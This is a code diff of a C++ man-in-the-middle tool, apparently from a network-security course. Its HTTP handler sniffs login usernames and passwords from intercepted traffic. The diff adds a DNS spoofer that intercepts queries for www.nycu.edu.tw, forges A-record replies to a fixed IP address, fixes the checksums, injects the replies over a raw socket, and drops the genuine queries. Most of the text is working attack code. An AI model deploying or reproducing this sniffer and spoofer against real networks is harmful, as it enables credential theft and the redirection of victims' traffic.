@@ -2,41 +2,220 @@
 
 using namespace std;
 
-void analyze_packet (char * data, int len) {
-	int c = 0, dport;
-	int iph_len = (((uint8_t) data[0])&0x0F)<<2;
-	int tcph_len = (((uint8_t) data[iph_len+12])&0xF0)>>2;
-    dport = (((uint8_t)data[iph_len+2])<<8)|((uint8_t)data[iph_len+3]);
+int analyze_packet (char * data, int len, int type, struct need_info info){
+    // type = 0: HTTP
+    // type = 1: DNS
 	
-    if(dport == 80){
-        string str = "", line, username = "", password = "";
-        for (c = iph_len + tcph_len; c<len; c++) {
-            str += data[c];
-        }
-        stringstream ss(str);
-        while(getline(ss, line, '\n')){
-            if(line.find("txtUsername=") != string::npos){
-                username = line.substr(line.find("txtUsername=") + 12, line.find('&') - line.find("txtUsername=") - 12);
-                password = line.substr(line.find("txtPassword=") + 12, line.find("\n"));
-                break;
+    if(type == 0){
+        int c = 0, dport;
+        int iph_len = (((uint8_t) data[0])&0x0F)<<2;
+        int tcph_len = (((uint8_t) data[iph_len+12])&0xF0)>>2;
+        dport = (((uint8_t)data[iph_len+2])<<8)|((uint8_t)data[iph_len+3]);
+        if(dport == 80){
+            string str = "", line, username = "", password = "";
+            for (c = iph_len + tcph_len; c<len; c++) {
+                str += data[c];
+            }
+            stringstream ss(str);
+            while(getline(ss, line, '\n')){
+                if(line.find("txtUsername=") != string::npos){
+                    username = line.substr(line.find("txtUsername=") + 12, line.find('&') - line.find("txtUsername=") - 12);
+                    password = line.substr(line.find("txtPassword=") + 12, line.find("\n"));
+                    break;
+                }
+            }
+            if(username != "" && password != ""){
+                cout << "Username: " << username << '\n';
+                cout << "Password: " << password << '\n';
             }
         }
-        if(username != "" && password != ""){
-            cout << "Username: " << username << '\n';
-            cout << "Password: " << password << '\n';
+    }
+    else{
+        // udp
+        int dport;
+        int iph_len = (((uint8_t) data[0])&0x0F)<<2, udph_len = 8;
+        //sport = (((uint8_t)data[iph_len])<<8)|((uint8_t)data[iph_len+1]);
+        dport = (((uint8_t)data[iph_len+2])<<8)|((uint8_t)data[iph_len+3]);
+        
+        if(dport == 53){
+            string str = "";
+            int dns_start = iph_len + udph_len;
+            //struct dns_hdr *hdr = (struct dns_hdr *) (data + dns_start);
+
+            int name_mv = dns_start + sizeof(dns_hdr);
+            int qname_len = 5; //qry.type and qry.class, and final 0 in qname
+            while(data[name_mv] != 0){
+                int part_len = data[name_mv];
+                qname_len += part_len + 1;
+                //cout << "len: " << part_len << '\n';
+                for(int j = 0; j < part_len; j++){
+                    name_mv++;
+                    str += data[name_mv];
+                }
+                name_mv++;
+                str += '.';
+            }
+
+            if(str.find("www.nycu.edu.tw") != string::npos){
+                send_dns_reply(data, len, qname_len, info);
+                //cout << "Target found\n";
+
+                return 1;
+            }
         }
     }
-    // if(dport == 53){
-    //     string str = "", line, domain = "";
-    //     for (c = iph_len + tcph_len; c<len; c++) {
-    //         str += data[c];
-    //     }
-    //     cout << str << '\n';
-    // }
+    return 0;
 }
 
-u_int32_t print_pkt (struct nfq_data *tb) {
-	int id = 0;
+void send_dns_reply(char *payload, int len, int qlen, struct need_info info){
+    char *data = new char[1024];
+    for(int i=0;i<len;i++){
+        data[i] = payload[i];
+    }
+
+    // for revising ip header total length and checksum
+    struct ip_hdr *iph = (struct ip_hdr *) data;
+    int iph_len = (((uint8_t) data[0])&0x0F)<<2, udph_len = 8;
+    iph->flags = 0;
+    uint tmp = iph->src_ip;
+    iph->src_ip = iph->dst_ip;
+    iph->dst_ip = tmp;
+
+    // for revising udp header length and checksum
+    struct udp_hdr *udph = (struct udp_hdr *) (data + iph_len);
+    udph->dst_port = udph->src_port;
+    udph->src_port = htons(53);
+
+    // for revising dns response content
+    struct dns_hdr *new_hdr = (struct dns_hdr *) (data + iph_len + udph_len);
+
+    new_hdr->flags = htons(0x8180);
+    // only 1 answer in reply (140.113.24.241)
+    new_hdr->ans_cnt = htons(1);
+    new_hdr->authrr_cnt = htons(0);
+    new_hdr->addrr_cnt = htons(0);
+
+    int resp_mv = iph_len + udph_len + sizeof(struct dns_hdr) + qlen;
+    struct resp_hdr *resp = (struct resp_hdr *) (data + resp_mv);
+    resp->name = htons(0xc00c); // compress name
+    resp->type = htons(1); // A record
+    resp->cls = htons(1); // IN internet
+    resp->ttl = htonl(5);
+    resp->len = htons(4);
+    resp_mv += sizeof(struct resp_hdr);
+    data[resp_mv] = 140; data[resp_mv+1] = 113; 
+    data[resp_mv+2] = 24; data[resp_mv+3] = 241;
+    resp_mv += 4;
+
+    // checksum calculation
+    // reference: https://bruce690813.blogspot.com/2017/09/tcpip-checksum.html
+    udph->len = htons(resp_mv - iph_len);
+    udph->checksum = 0;
+    // calculate udp checksum
+    uint32_t sum = 0;
+    // pseudo header
+    sum += ntohs(iph->src_ip>>16) + ntohs(iph->src_ip&0xFFFF);
+    sum += ntohs(iph->dst_ip>>16) + ntohs(iph->dst_ip&0xFFFF);
+    sum += 0x0011; // UDP
+    sum += (resp_mv - iph_len);
+    auto buf = reinterpret_cast<const uint16_t*>(udph);
+    int len_buf = (resp_mv - iph_len)%2 ? (resp_mv - iph_len)/2+1 : (resp_mv - iph_len)/2;
+    for(int i = 0; i < len_buf; i++){
+        sum += ntohs(buf[i]);
+    }
+    while (sum >> 16) {
+        sum = (sum & 0xFFFF) + (sum >> 16);
+    }
+    udph->checksum = ~htons(sum);
+
+    // calculate ip checksum
+    iph->tlen = htons(resp_mv);
+    iph->checksum = 0;
+    sum = 0;
+    buf = reinterpret_cast<const uint16_t*>(iph);
+    for(int i = 0; i < iph->ihl * 2; i++){
+        sum += ntohs(buf[i] & 0xFFFF);
+    }
+    while (sum >> 16) {
+        sum = (sum & 0xFFFF) + (sum >> 16);
+    }
+    iph->checksum = ~htons(sum);
+
+    // send data out
+    send_data_udp(data, resp_mv, info);
+}
+
+void send_data_udp(char *data, int len, struct need_info info){
+    //raw socket
+    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
+    // int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if(fd < 0){
+        perror("socket()");
+        return;
+    }
+
+    uint32_t my_ip;
+    int ifidx;
+    unsigned char my_mac[6];
+    get_if_info(info.ifname, &my_ip, my_mac, &ifidx);
+
+    char *sendbuf = new char[1024];
+    memset(sendbuf, 0, 1024);
+    struct ethhdr *eth = (struct ethhdr *) sendbuf;
+    string dest_ip;
+    for(int i=0;i<4;i++){
+        dest_ip += to_string((unsigned)data[16+i] & 0xFF);
+        if(i != 3) dest_ip += '.';
+    }
+    memcpy(eth->h_source, my_mac, MAC_LENGTH);
+    unsigned char *dest_mac = new unsigned char[6];
+    str2mac(info.arp_table[dest_ip].c_str(), dest_mac);
+    memcpy(eth->h_dest, dest_mac, MAC_LENGTH);
+    eth->h_proto = htons(ETH_P_IP);
+
+    for(int i=ETH2_HEADER_LEN;i<len+ETH2_HEADER_LEN;i++){
+        sendbuf[i] = data[i-ETH2_HEADER_LEN];
+    }
+
+    // dump
+    // for(int i=0;i<len+ETH2_HEADER_LEN;i++){
+    //     cout << hex << (unsigned)sendbuf[i] << ' ';
+    //     if(i%16 == 15) cout << '\n';
+    // }
+    // cout << '\n';
+
+
+    struct sockaddr_ll sll;
+    memset(&sll, 0, sizeof(struct sockaddr_ll));
+    sll.sll_family = AF_PACKET;
+    sll.sll_ifindex = ifidx;
+    if (bind(fd, (struct sockaddr*) &sll, sizeof(struct sockaddr_ll)) < 0) {
+        perror("bind");
+    }
+
+    struct sockaddr_ll socket_address;
+    socket_address.sll_family = AF_PACKET;
+    socket_address.sll_protocol = htons(ETH_P_IP);
+    socket_address.sll_ifindex = ifidx;
+    socket_address.sll_hatype = htons(ARPHRD_ETHER);
+    socket_address.sll_pkttype = (PACKET_BROADCAST);
+    socket_address.sll_halen = MAC_LENGTH;
+    socket_address.sll_addr[6] = 0x00;
+    socket_address.sll_addr[7] = 0x00;
+    memcpy(socket_address.sll_addr, my_mac, MAC_LENGTH);
+
+    if(sendto(fd, sendbuf, len+ETH2_HEADER_LEN, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0){
+        perror("sendto()");
+    }
+    close(fd);
+    delete[] sendbuf;
+    delete[] data;
+
+    return;
+}
+
+pair<uint,uint> print_pkt (struct nfq_data *tb, int type, struct need_info info) {
+	uint id = 0, chk = 0;
 	struct nfqnl_msg_packet_hdr *ph;
 	int ret;
 	char *data;
@@ -45,22 +224,29 @@ u_int32_t print_pkt (struct nfq_data *tb) {
 	if (ph) {
 		id = ntohl(ph->packet_id);
 	}
-
+    
 	ret = nfq_get_payload(tb, reinterpret_cast<unsigned char**>(&data));
 	if (ret >= 0) {
-		analyze_packet (data, ret);
+		chk = analyze_packet (data, ret, type, info);
 	}
 
-	return id;
+	return make_pair(id, chk);
 }
 	
 
 int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data){
-	u_int32_t id = print_pkt(nfa);
-	return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+	pair<uint,uint> pr = print_pkt(nfa, 0, *(struct need_info*)data);
+	return nfq_set_verdict(qh, pr.first, NF_ACCEPT, 0, NULL);
 }
 
-void nfq_thread(){
+int cb_dns(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data){
+	pair<uint,uint> pr = print_pkt(nfa, 1, *(struct need_info*)data);
+
+	if(pr.second) return nfq_set_verdict(qh, pr.first, NF_DROP, 0, NULL);
+    else return nfq_set_verdict(qh, pr.first, NF_ACCEPT, 0, NULL);
+}
+
+void nfq_thread(int type, struct need_info info){
     struct nfq_handle *h;
 	struct nfq_q_handle *qh;
 	int fd;
@@ -87,7 +273,8 @@ void nfq_thread(){
 	}
 
 	// printf("binding this socket to queue '0'\n");
-	qh = nfq_create_queue(h, 0, &cb, NULL);
+	if(type==0) qh = nfq_create_queue(h, 0, &cb, (void*)&info);
+    else {qh = nfq_create_queue(h, 0, &cb_dns, (void*)&info);}
 	if (!qh) {
 		fprintf(stderr, "error during nfq_create_queue()\n");
 		exit(1);
@@ -343,41 +530,6 @@ out:
     return err;
 }
 
-/*
- * Creates a raw socket that listens for ARP traffic on specific ifindex.
- * Writes out the socket's FD.
- * Return 0 on success.
- */
-int bind_all(int ifindex, int *fd)
-{
-    //debug("bind_arp: ifindex=%i", ifindex);
-    int ret = -1;
-
-    // Submit request for a raw socket descriptor.
-    *fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-    if (*fd < 1) {
-        perror("socket()");
-        goto out;
-    }
-
-    //debug("Binding to ifindex %i", ifindex);
-    struct sockaddr_ll sll;
-    memset(&sll, 0, sizeof(struct sockaddr_ll));
-    sll.sll_family = AF_PACKET;
-    sll.sll_ifindex = ifindex;
-    if (bind(*fd, (struct sockaddr*) &sll, sizeof(struct sockaddr_ll)) < 0) {
-        perror("bind");
-        goto out;
-    }
-
-    ret = 0;
-out:
-    if (ret && *fd > 0) {
-        debug("Cleanup socket");
-        close(*fd);
-    }
-    return ret;
-}
 
 /*
  * Creates a raw socket that listens for ARP traffic on specific ifindex.
@@ -471,7 +623,6 @@ int read_arp(int fd, map<string, string> &arp_table)
 
     ret = 0;
 
-out:
     return ret;
 }
 
